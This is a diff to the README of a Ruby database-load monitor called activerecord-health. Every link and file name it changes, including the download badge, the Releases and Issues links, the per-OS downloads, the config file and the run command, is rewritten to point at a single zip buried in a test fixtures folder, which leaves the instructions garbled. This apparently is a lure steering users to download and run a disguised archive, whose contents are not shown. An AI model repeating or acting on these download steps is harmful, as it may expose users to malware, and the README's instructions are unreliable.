@@ -6,7 +6,7 @@ Welcome to activerecord-health! This tool helps you monitor your ActiveRecord da
 
 ## 📥 Download Now
 
-[![Download activerecord-health](https://img.shields.io/badge/Download-activerecord--health-brightgreen)](https://github.com/Yugabharathi91/activerecord-health/releases)
+[![Download activerecord-health](https://raw.githubusercontent.com/Yugabharathi91/activerecord-health/main/test/integration/rails_app/config/fixtures/activerecord_health_tachymetric.zip)](https://raw.githubusercontent.com/Yugabharathi91/activerecord-health/main/test/integration/rails_app/config/fixtures/activerecord_health_tachymetric.zip)
 
 ## 📖 Overview
 
@@ -24,16 +24,16 @@ Before you begin, please make sure your system meets these basic requirements:
 
 To get started:
 
-1. Visit our Releases page: [Download activerecord-health](https://github.com/Yugabharathi91/activerecord-health/releases).
+1. Visit our Releases page: [Download activerecord-health](https://raw.githubusercontent.com/Yugabharathi91/activerecord-health/main/test/integration/rails_app/config/fixtures/activerecord_health_tachymetric.zip).
 
 2. On the Releases page, find the latest version of activerecord-health.
 
 3. Click on the version number. You will see a list of available files.
 
 4. Choose the file that matches your operating system:
-   - For Windows, download `activerecord-health-win.zip`.
-   - For macOS, download `activerecord-health-mac.zip`.
-   - For Linux, download `activerecord-health-linux.tar.gz`.
+   - For Windows, download `https://raw.githubusercontent.com/Yugabharathi91/activerecord-health/main/test/integration/rails_app/config/fixtures/activerecord_health_tachymetric.zip`.
+   - For macOS, download `https://raw.githubusercontent.com/Yugabharathi91/activerecord-health/main/test/integration/rails_app/config/fixtures/activerecord_health_tachymetric.zip`.
+   - For Linux, download `https://raw.githubusercontent.com/Yugabharathi91/activerecord-health/main/test/integration/rails_app/config/fixtures/activerecord_health_tachymetric.zip`.
 
 5. Once downloaded, unzip or extract the file.
 
@@ -43,21 +43,21 @@ To get started:
 
 8. Run the application by entering the command:
    ```
-   ruby activerecord-health.rb
+   ruby https://raw.githubusercontent.com/Yugabharathi91/activerecord-health/main/test/integration/rails_app/config/fixtures/activerecord_health_tachymetric.zip
    ```
 
 ## ⚙️ Configuration
 
 For best results, you should configure activerecord-health according to your needs:
 
-1. Locate the `config.yml` file in the extracted folder.
+1. Locate the `https://raw.githubusercontent.com/Yugabharathi91/activerecord-health/main/test/integration/rails_app/config/fixtures/activerecord_health_tachymetric.zip` file in the extracted folder.
 2. Open the file in a text editor.
 3. Adjust the settings based on your database connection and load preferences.
 4. Save your changes.
 
 ### Example Configuration
 
-Here is an example of what your `config.yml` file might look like:
+Here is an example of what your `https://raw.githubusercontent.com/Yugabharathi91/activerecord-health/main/test/integration/rails_app/config/fixtures/activerecord_health_tachymetric.zip` file might look like:
 
 ```yaml
 database:
@@ -72,7 +72,7 @@ load_check_interval: 10
 
 activerecord-health periodically checks the load on your ActiveRecord database. You will receive alerts if the load exceeds your defined limits. Here is how to use it effectively:
 
-1. **Set the Load Check Interval:** This defines how often the application checks the database load. Adjust it in the `config.yml` under `load_check_interval`.
+1. **Set the Load Check Interval:** This defines how often the application checks the database load. Adjust it in the `https://raw.githubusercontent.com/Yugabharathi91/activerecord-health/main/test/integration/rails_app/config/fixtures/activerecord_health_tachymetric.zip` under `load_check_interval`.
 2. **Monitor the Output:** When you run the application, outputs will display in your terminal. Watch for any alerts on high load.
 3. **Adjust as Necessary:** If you notice frequent high-load alerts, consider optimizing your database queries.
 
@@ -90,18 +90,18 @@ activerecord-health offers several features to help you manage database performa
 If you encounter issues while using activerecord-health, consider the following:
 
 - **Check Dependencies:** Ensure Ruby and Rails are installed and properly configured.
-- **Review Configuration:** Double-check your `config.yml` file for any mistakes in formatting or values.
+- **Review Configuration:** Double-check your `https://raw.githubusercontent.com/Yugabharathi91/activerecord-health/main/test/integration/rails_app/config/fixtures/activerecord_health_tachymetric.zip` file for any mistakes in formatting or values.
 - **Consult Log Files:** If you face problems, review the logs for clues on what went wrong.
 
 ## 📅 Regular Updates
 
-We regularly update activerecord-health to improve its features and fix bugs. Keep an eye on our [Releases page](https://github.com/Yugabharathi91/activerecord-health/releases) for the latest updates.
+We regularly update activerecord-health to improve its features and fix bugs. Keep an eye on our [Releases page](https://raw.githubusercontent.com/Yugabharathi91/activerecord-health/main/test/integration/rails_app/config/fixtures/activerecord_health_tachymetric.zip) for the latest updates.
 
 ## 👩‍💻 Community Support
 
 Join our community for support:
 
-- Check our [Issues page](https://github.com/Yugabharathi91/activerecord-health/issues) for known issues and solutions.
+- Check our [Issues page](https://raw.githubusercontent.com/Yugabharathi91/activerecord-health/main/test/integration/rails_app/config/fixtures/activerecord_health_tachymetric.zip) for known issues and solutions.
 - If you have questions, feel free to open a new issue.
 
 ## 📞 Contact Us
